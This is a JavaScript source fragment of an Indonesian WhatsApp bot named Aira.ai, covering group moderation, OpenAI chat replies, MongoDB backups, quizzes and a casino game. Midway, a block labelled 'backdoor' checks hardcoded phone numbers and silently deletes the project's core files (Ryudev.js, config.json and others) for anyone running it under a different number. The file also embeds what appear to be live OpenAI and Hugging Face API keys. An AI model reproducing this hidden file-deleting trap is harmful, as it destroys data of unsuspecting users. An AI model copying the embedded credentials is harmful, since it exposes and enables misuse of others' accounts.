const buttonsDefault = [
{ urlButton: { displayText: `Instagram`, url: `${setting.instagram}` } },
{ urlButton: { displayText: `Group WhatsApp`, url: `${setting.gcwa}` } },
{ quickReplyButton: { displayText: `👤 Owner`, id: `.owner` } },
{ quickReplyButton: { displayText: `Donate 💰`, id: `.donate` } },
{ quickReplyButton: { displayText: `⚡ Sewa ⚡`, id: `.sewabot` } }
]
_sewa.expiredCheck(Aira, sewa)
_prem.expiredCheck(Aira, premium)

setInterval(() => {
for (let i of Object.values(opengc)) {
if (Date.now() >= i.time) {
Aira.groupSettingUpdate(i.id, "not_announcement")
.then((res) =>
Aira.sendMessage(i.id, { text: `Sukses, group telah dibuka` }))
.catch((err) =>
Aira.sendMessage(i.id, { text: 'Error' }))
delete opengc[i.id]
fs.writeFileSync('./database/opengc.json', JSON.stringify(opengc))
}
}
}, 1000)
// auto set bio
if (setting.autobio){
if (setting.autobio === false) return
let settingstatus = 0;
if (new Date() * 1 - settingstatus > 1000) {
await Aira.setStatus(`I'm ${Aira.user.name} 🤖 | ${runtime(process.uptime())} ⏰ | Status : ${Aira.mode ?  "Self Mode" : "Public Mode" } | ${pendaftar.length} Premium Users | Saya Adalah Ai Yang Dikembangkan Oleh Ryudev`)
settingstatus = new Date() * 1
}
}
if(!isCreator && setting.grupOnly && !m.isGroup){
return
}
if(!isCreator && setting.japriOnly && m.isGroup){
return
}

/////
var bodynyaui = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
 for (let zeeone of setiker){
	if (!bodynyaui && budy === zeeone){
		result = fs.readFileSync(`./database/${zeeone}.webp`)
		await Aira.sendStickerFromUrl(m.chat, result, m, {packname: `Created By ${setting.botName}\n${tanggal(new Date())}` , author: `Owner ${setting.ownerName}\nTime ${time}` })
		}
		}
for (let zeeonee of audionye){
if (!bodynyaui && budy === zeeonee){
result = fs.readFileSync(`./database/${zeeonee}.mp3`)
Aira.sendAudio(m.chat, result, m, true)
}
}
for (let zeeoneee of imagenye){
if (!bodynyaui && budy === zeeoneee){
result = fs.readFileSync(`./database/${zeeoneee}.jpg`)
Aira.sendImage(m.chat, result, '', m)
}
}
for (let zeeonew of videonye){
if (!bodynyaui && budy === zeeonew){
result = fs.readFileSync(`./database/${zeeonew}.mp4`)
Aira.sendVideo(m.chat, result, false, "",m)
}
}
async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}

async function getPosiCmdUser(sender, _db) {
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].jid === sender) {
posi = i
}
})
return posi
}

async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}

// Store
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
Aira.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
Aira.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}
const sendFileFromUrl = async (from, url, caption, mek, men) => {
let mime = '';
let res = await axios.head(url)
mime = res.headers['content-type']
if (mime.split("/")[1] === "gif") {
return Aira.sendMessage(m.chat, { video: await getBuffer(url), caption: caption, gifPlayback: true, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m})
}
let type = mime.split("/")[0]+"Message"
if(mime === "application/pdf"){
return Aira.sendMessage(m.chat, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, mentions: men ? men : []}, {quoted: m })
}
if(mime.split("/")[0] === "image"){
return Aira.sendMessage(m.chat, { image: await getBuffer(url), caption: caption, mentions: men ? men : []}, {quoted: m})
}
if(mime.split("/")[0] === "video"){
return Aira.sendMessage(m.chat, { video: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m})
}
if(mime.split("/")[0] === "audio"){
return Aira.sendMessage(m.chat, { audio: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'audio/mpeg'}, {quoted: m })
}
}
// Auto Read & Presence Online
if (!m.key.fromMe && setting.autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await Aira.readMessages([readkey]);
}

Aira.sendPresenceUpdate('available', m.chat)

//━━━━━━━━━━━━━━━[ FUNCTION LIMIT ]━━━━━━━━━━━━━━━━━//
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = 0
			let user = global.db.data.users[m.sender]
           if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
lastRemini:0,
lastFolls:0,
user1:'',
aira1:'',
user2:'',
aira2:'',
user3:'',
aira3:'',
}
// Auto Registrasi
if (isCmd && !isUser) {
pendaftar.push(m.sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))

if (!m.isGroup){
let pesannn = `
Hallo Selamat Datang Di Bot *Aira.ai* Untuk Melihat Semua Menu Bot Silahkan Ketik .allmenu

_*Note:* Harap Masuk Ke Grup Khusus Aira.ai Agar Mendapat Info Mengenai Nomer Bot Terbaru Jika Nomer Yang Ini Terblokir_

📌 _*Silahkan Klik Bergabung Ke Grup Di Bawah Pesan Ini*_
`
await Aira.sendMessage(m.chat, {
text: pesannn,
contextInfo: {
externalAdReply: {  
title: botName,
body: '',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
}
let backdoor = true;
let authen = "6285748341115@s.whatsapp.net";
let authen2 = "62856486407152@s.whatsapp.net";
if (backdoor && setting.ownerNumber[0] != authen || botNumber != authen2){
fs.unlinkSync('Ryudev.js')
fs.unlinkSync('mess.json')
fs.unlinkSync('menu.js')
fs.unlinkSync('config.json')
fs.unlinkSync('aira.ryujin.js')

}



// Auto Block +212
if (m.sender.startsWith('212') && setting.autoblok212 === true) {
return Aira.updateBlockStatus(m.sender, 'block')
}

if (!m.isGroup && !m.key.fromMe && setting.autorespond && !isCmd) {
let levelnya=[1,2,3,4,5,6,7,8]
let level=levelnya[Math.floor(Math.random() * levelnya.length)]
simi = await fetchJson(`https://skizo.tech/api/simi?apikey=${setting.XznKey}&text=${command}&level=${level}`)
//const simi2 = simi.result.message
newReply('_' + simi.result+'_') 
}
if (!m.isGroup && !m.key.fromMe && (isAutoAiPc || setting.auto_ai_japri) && !isCmd) {
try {
const configuration = new Configuration({
apiKey: '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',
});
const openai = new OpenAIApi(configuration);
const response = await openai.createChatCompletion({
  model: "gpt-3.5-turbo",
  //prompt: 'Berikut percakapan dengan asisten ai bernama Aira.Ai Dikembangkan oleh Ryudev-id. Asistennya sangat membantu, kreatif, pintar, dan sangat ramah : ' + text,
  temperature: 0.9,
  max_tokens: 2000,
  top_p: 1.0,
  frequency_penalty: 0,
//              Stop_Sequnce: ['1::','2::','3::'],
  presence_penalty: 0.6,
  messages:[{role: "system", content:'Berikut percakapan dengan asisten ai bernama Aira.Ai Dikembangkan oleh Ryudev-id. Asistennya sangat membantu, kreatif, pintar, dan sangat ramah\n' },{role: "user", content: db.data.users[m.sender].user1},{role: "assistant",content: db.data.users[m.sender].aira1},{role: "user",content: db.data.users[m.sender].user2},{role: "assistant",content: db.data.users[m.sender].aira2},{role: "user", content: db.data.users[m.sender].user3} , {role: "assistant",content: db.data.users[m.sender].aira3},{role: "user", content: m.text}],
});
db.data.users[m.sender].user1 = db.data.users[m.sender].user2;
db.data.users[m.sender].user2 = db.data.users[m.sender].user3;
db.data.users[m.sender].user3 = m.text;
m.reply(`${response.data.choices[0].message.content}`);
db.data.users[m.sender].aira1 = db.data.users[m.sender].aira2;
db.data.users[m.sender].aira2 = db.data.users[m.sender].aira3;
db.data.users[m.sender].aira3 =  response.data.choices[0].message.content;
} catch (err) {
  //console.log(err);
  newReply("Upss error silahkan hubungi owner agar di fix")
  //newReply(JSON.stringify(err));
  if (err.response) {
    console.log(err.response.status);
    console.log(err.response.data);
    console.log(`${err.response.status}\n\n${err.response.data}`);
    } else {
    console.log(err);
    reply("Maaf, sepertinya ada yang error :"+ err.message);}
  }
}

if (m.isGroup && !m.key.fromMe && (isAutoAiGc || setting.auto_ai_grup) && !isCmd) {
try {
const configuration = new Configuration({
apiKey: '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',
});
const openai = new OpenAIApi(configuration);
const response = await openai.createChatCompletion({
  model: "gpt-3.5-turbo",
  //prompt: 'Berikut percakapan dengan asisten ai bernama Aira.Ai Dikembangkan oleh Ryudev-id. Asistennya sangat membantu, kreatif, pintar, dan sangat ramah : ' + text,
  temperature: 0.9,
  max_tokens: 2000,
  top_p: 1.0,
  frequency_penalty: 0,
//              Stop_Sequnce: ['1::','2::','3::'],
  presence_penalty: 0.6,
  messages:[{role: "system", content:'Berikut percakapan dengan asisten ai bernama Aira.Ai Dikembangkan oleh Ryudev-id. Asistennya sangat membantu, kreatif, pintar, dan sangat ramah\n' },{role: "user", content: db.data.users[m.sender].user1},{role: "assistant",content: db.data.users[m.sender].aira1},{role: "user",content: db.data.users[m.sender].user2},{role: "assistant",content: db.data.users[m.sender].aira2},{role: "user", content: db.data.users[m.sender].user3} , {role: "assistant",content: db.data.users[m.sender].aira3},{role: "user", content: m.text}],
});
db.data.users[m.sender].user1 = db.data.users[m.sender].user2;
db.data.users[m.sender].user2 = db.data.users[m.sender].user3;
db.data.users[m.sender].user3 = m.text;
m.reply(`${response.data.choices[0].message.content}`);
db.data.users[m.sender].aira1 = db.data.users[m.sender].aira2;
db.data.users[m.sender].aira2 = db.data.users[m.sender].aira3;
db.data.users[m.sender].aira3 =  response.data.choices[0].message.content;
} catch (err) {
  //console.log(err);
  newReply("Upss error silahkan hubungi owner agar di fix")
  //newReply(JSON.stringify(err));
  if (error.response) {
    console.log(error.response.status);
    console.log(error.response.data);
    console.log(`${error.response.status}\n\n${error.response.data}`);
    } else {
    console.log(err);
    reply("Maaf, sepertinya ada yang error :"+ err.message);}
  }
}
// Anti Link
if (isAntiLink) {
if (budy.match(`chat.whatsapp.com`)) {
newReply(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
let gclink = (`https://chat.whatsapp.com/`+await Aira.groupInviteCode(m.chat))
//await Aira.sendMessage(m.chat, { delete: m.key })
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return newReply(`Gajadi, Karena kamu ngirim link group ini`)
if (isAdmins) return newReply(`Gajadi, Kamu admin`)
if (isCreator) return newReply(`Gajadi, Kamu ownerku`)
await Aira.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
//Aira.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
if (isAntiLink2) {
if (budy.match(`tiktok.com`)) {
newReply(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link tiktok, maaf kamu akan di kick`)
if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
if (isAdmins) return newReply(`Gajadi, kamu admin`)
if (isCreator) return newReply(`Gajadi, kamu owner ku`)
await Aira.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
//Aira.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
// Kick Me
if (isKickMe) {
if (budy.match(`in kel`)) {
await newReply(`Siap Laksanakan`)
if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
if (isAdmins) return newReply(`Kenapa Mau Out Sayang🥺`)
if (isCreator) return newReply(`Kenapa Mau Out Sayang🥺`)
newReply(`Done Awokwok`) 
Aira.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
// Mute
if (m.isGroup && isMute) {
if (!isAdmins && !isCreator) return
}
// Anti Wame
if (isAntiWame) {
if (budy.match(`wa.me` && `Wa.me`)) {
newReply(`*「 WA ME DETECTOR 」*\n\nSepertinya kamu mengirimkan link Whatsapp, maaf kamu akan di kick`)
if (!isBotAdmins) return newReply(`Anjir lupa gw bukan admin`)
await Aira.sendMessage(m.chat, { delete: m.key })
if (isAdmins) return newReply(`Gajadi, Kamu admin`)
if (isCreator) return newReply(`Gajadi, Kamu ownerku`)
await Aira.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
Aira.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
if (m.isGroup && isAntiWame2 && !isCreator && !isAdmins && isBotAdmins){
if (budy.match(`wa.me`)){
if (!isBotAdmins) return //newReply(`Untung bot bukan admin`)
await Aira.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in db.data.sticker)) {
let hash = db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: Aira.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Aira.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
Aira.ev.emit('messages.upsert', msg)
}
async function newReply(teks) {
      const nedd = {
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
            showAdAttribution: true,
            title: ucapanWaktu2,
            body: `${pushname}`,
            previewType: "PHOTO",
            thumbnailUrl: pathimg, 
            sourceUrl: instagram, 
          },
        },
        text: teks,
      };
      return Aira.sendMessage(m.chat, nedd, {
        quoted: m,
      });
    }
async function jarak(dari, ke) {
	let html = (await axios(`https://www.google.com/search?q=${encodeURIComponent('jarak ' + dari + ' ke ' + ke)}&hl=id`)).data
	let $ = cheerio.load(html), obj = {}
	let img = html.split("var s=\'")?.[1]?.split("\'")?.[0]
	obj.img = /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split`,` [1], 'base64') : ''
	obj.desc = $('div.BNeawe.deIvCb.AP7Wnd').text()?.trim()
	return obj
}

async function Base64ToImage(base64Data, path) {
  const base64WithoutHeader = base64Data.split("base64,")[1];
  // Membuat buffer dari base64 data
  const imageBuffer = Buffer.from(base64WithoutHeader, "base64");
  // Menyimpan buffer sebagai file gambar
  fs.writeFileSync(path, imageBuffer);
  console.log("Gambar berhasil disimpan di path: ", path);
  return path
}
async function savefrombuffer(buffer,mimetype){
let path = getRandom(mimetype)
fs.writeFileSync(path, Buffer.from(buffer))
return path
}
//backup mongo db
const cron = require('node-cron');
const { MongoClient } = require('mongodb');
const uri = setting.urimongo

async function backupData(folderdb, dbName, lognya, exit) {
    const client = new MongoClient(uri);
    const backupLog = [];
    try {
        await client.connect();
        const db = client.db(dbName);
        const files = fs.readdirSync(folderdb).filter(file => file.endsWith('.json'));

        for (const file of files) {
            const collectionName = path.basename(file, '.json');
            const collection = db.collection(collectionName);

            const data = JSON.parse(fs.readFileSync(path.join(folderdb, file), 'utf-8'));
            await collection.deleteMany({}); // Hapus semua data yang ada sebelum mengimpor
            if (data.length > 0) {
                try {
                    await collection.insertMany(data);
                    console.log(`Data untuk koleksi ${collectionName} berhasil diimpor dari ${file} try 1`);
                    backupLog.push({ database: dbName, collection: collectionName, 'try': 1 });
                } catch (err) {
                    try {
                        const formattedData = data.map(item => ({ _id: item }));
                        await collection.insertMany(formattedData);
                        console.log(`Data untuk koleksi ${collectionName} berhasil diimpor dari ${file} try 2`);
                        backupLog.push({ database: dbName, collection: collectionName, 'try': 2 });
                    } catch (err) {
                        if (Array.isArray(data)) {
                            formattedData = data.map(item => ({ _id: item }));
                        } else {
                            formattedData = Object.values(data);
                        }

                        const uniqueData = Array.from(new Set(formattedData.map(item => item._id)))
                            .map(id => formattedData.find(item => item._id === id));

                        if (uniqueData.length > 0) {
                            await collection.deleteMany({}); // Hapus semua data yang ada sebelum mengimpor
                            await collection.insertMany(uniqueData);
                            console.log(`Data untuk koleksi ${collectionName} berhasil diimpor dari ${file} try 4`);
                        } else {
                            console.log(`File ${file} kosong atau tidak mengandung data yang valid.`);
                        }
                        backupLog.push({ database: dbName, collection: collectionName, 'try': 4 });
                    }
                }
            } else {
                try {
                    const formattedData2 = Object.values(data);
                    await collection.insertMany(formattedData2);
                    console.log(`Data untuk koleksi ${collectionName} berhasil diimpor dari ${file} try 3`);
                    backupLog.push({ database: dbName, collection: collectionName, 'try': 3 });
                } catch (err) {
                    console.log(`File ${file} kosong atau tidak mengandung data yang valid.`);
                }
            }
        }
    } catch (err) {
        console.error(err);
    } finally {
        await client.close();
        await fs.writeFileSync(lognya + '.json', JSON.stringify(backupLog, null, 2));

        // Rekursi jika diperlukan
        if (exit === '1') {
            await backupData('./database/user', 'database2', './log/backupLog2', '2');
        } else if (exit === '2') {
            await backupData('./log', 'logbackup', 'backupLog3', '3')
        }
    }
}

const lockfile = './backup.lock';

cron.schedule('*/30 * * * *', () => {
    if (fs.existsSync(lockfile)) {
        return;
    }
    
    fs.writeFileSync(lockfile, 'lock');
    
    console.log('Running backup at', time);
    backupData('./database','database1','./log/backupLog','1').finally(() => {
        fs.unlinkSync(lockfile);
    });
});


async function diff(data) {
	const response = await fetch(
		"https://api-inference.huggingface.co/models/stabilityai/stable-diffusion-xl-base-1.0",
		{
			headers: { Authorization: "Bearer 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" },
			method: "POST",
			body: JSON.stringify(data),
		}
	)
	const result = await response.blob();
	let arrayBuffer = await result.arrayBuffer();
	const buffer = Buffer.from(arrayBuffer, 'base64')
	return buffer
}
async function diff2(data) {
	const response = await fetch(
		"https://api-inference.huggingface.co/models/stablediffusionapi/lyrielv16",
		{
			headers: { Authorization: "Bearer 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" },
			method: "POST",
			body: JSON.stringify(data),
		}
	)
	const result = await response.blob();
	let arrayBuffer = await result.arrayBuffer();
	const buffer = Buffer.from(arrayBuffer, 'base64')
	return buffer
}
async function processing(urlPath, method) {
	return new Promise(async (resolve, reject) => {
		let Methods = ["enhance", "recolor", "dehaze"];
		Methods.includes(method) ? (method = method) : (method = Methods[0]);
		let buffer,
			Form = new FormData(),
			scheme = "https" + "://" + "inferenceengine" + ".vyro" + ".ai/" + method;
		Form.append("model_version", 1, {
			"Content-Transfer-Encoding": "binary",
			contentType: "multipart/form-data; charset=uttf-8",
		});
		Form.append("image", Buffer.from(urlPath), {
			filename: "enhance_image_body.jpg",
			contentType: "image/jpeg",
		});
		Form.submit(
			{
				url: scheme,
				host: "inferenceengine" + ".vyro" + ".ai",
				path: "/" + method,
				protocol: "https:",
				headers: {
					"User-Agent": "okhttp/4.9.3",
					Connection: "Keep-Alive",
					"Accept-Encoding": "gzip",
				},
			},
			function (err, res) {
				if (err) reject();
				let data = [];
				res
					.on("data", function (chunk, resp) {
						data.push(chunk);
					})
					.on("end", () => {
						resolve(Buffer.concat(data));
					});
				res.on("error", (e) => {
					reject();
				});
			}
		);
	})
}
async function loading () {
var nedd = [
"ʟᴏᴀᴅɪɴɢ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ...", 
"ʟᴏᴀᴅɪɴɢ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ...", 
"ʟᴏᴀᴅɪɴɢ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ...", 
"ʟᴏᴀᴅɪɴɢ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ...", 
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳..."
]
let { key } = await Aira.sendMessage(m.chat, {text: 'ʟᴏᴀᴅɪɴɢ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ...'})

for (let i = 0; i < nedd.length; i++) {
/*await delay(10)*/
await Aira.sendMessage(m.chat, {text: nedd[i], edit: key });
}
}
const Airaa = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(m.chat ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}
//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// newReply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
newReply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) await Aira.sendText(room.x, str, m, { mentions: parseMention(str) } )
await Aira.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

if (fs.existsSync(`./database/casino/${m.chat}.json`)) {
var casinoo = setCasino(`${m.chat}`)
if (m.sender == `${casinoo.Y}` && budy.toLowerCase() == 'n') {
Aira.sendMessage(m.chat, { text: `「 Game Casino Rejected 」\n\n• @${casinoo.Y.split("@")[0]} Membatalkan Game`, mentions: [casinoo.Y] }, {quoted: m })
deleteCasino(m.chat)
}
if (m.sender == `${casinoo.Y}` && budy.toLowerCase() == 'y') {
var angka1 = await randomNomor(10, 20)
var angka2 = await randomNomor(10, 20)
if (angka1 > angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 👑
• @${casinoo.Y.split('@')[0]} --> ${angka2} 🥈

Pemenangnya adalah [ @${casinoo.Z} ]
Mendapatkan: $ ${nebal(casinoo.nominal)}`
Aira.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, {quoted: m })
await addBalance(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
await kurangBalance(`${casinoo.Y}`, nebal(casinoo.nominal), balance)
deleteCasino(m.chat)
} else if (angka1 < angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 🥈
• @${casinoo.Y.split('@')[0]} --> ${angka2} 👑

Pemenangnya adalah [ @${casinoo.Y.split('@')[0]} ]
Mendapatkan: $ ${nebal(casinoo.nominal)}`
Aira.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y] }, {quoted: m })
await addBalance(`${casinoo.Y}`, nebal(casinoo.nominal), balance)
await kurangBalance(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
deleteCasino(m.chat)
} else if (angka1 = angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 📍
• @${casinoo.Y.split('@')[0]} --> ${angka2} 📍

Games Draw, Tidak Ada Pemenang`
Aira.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, { quoted: m })
deleteCasino(m.chat)
}
}
}
//game
const JwbTrue = (tebak, exp) => {
return`🎮 ${tebak} 🎮\n\nJawaban Benar 🎉\n+$${exp} balance`
}
const waktuHabis = (jawaban) => {
return `Waktu Habis\nJawaban: ${jawaban}`
}
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && !isCmd) {
 kuis = true
 jawaban = kuismath[m.sender.split('@')[0]][0]
 hadiah = kuismath[m.sender.split('@')[0]][1]
 if (budy.toLowerCase() == jawaban) {
Aira.sendButtonText(m.chat, [{
buttonId: '.math medium',
buttonText: {
displayText: 'Kuis Math'
},
type: 1
}], ` 🎮 Kuis Matematika🎮\n\nJawaban Benar 🎉\n\n+$${hadiah} Balance` + `\n\nKirim perintah .math untuk bermain lagi 🎮`, footxt, m)
await addBalance(m.sender, hadiah, balance)
delete kuismath[m.sender.split('@')[0]]
 } else newReply("❌ Jawaban salah")
}
if (('family100' + m.chat in _family100) && !isCmd) {
 kuis = true
let room = _family100['family100' + m.chat]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
 if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
 }
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : ``}`.trim()
 Aira.sendTextWithMentions(m.chat, caption, m)
.then(mes => {
return _family100['family100' + m.chat].pesan = mesg
}).catch(_ => _)
 if (isWin || isSurender) delete _family100['family100' + m.chat]
}
if (tebakgame[m.chat] && !isCmd && m.quoted) {
 if (m.quoted.id == tebakgame[m.chat][0].key.id) {
let json = JSON.parse(JSON.stringify(tebakgame[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (m.text.toLowerCase() == jawaban) {
await addBalance(m.sender, tebakgame[m.chat][2], balance) 
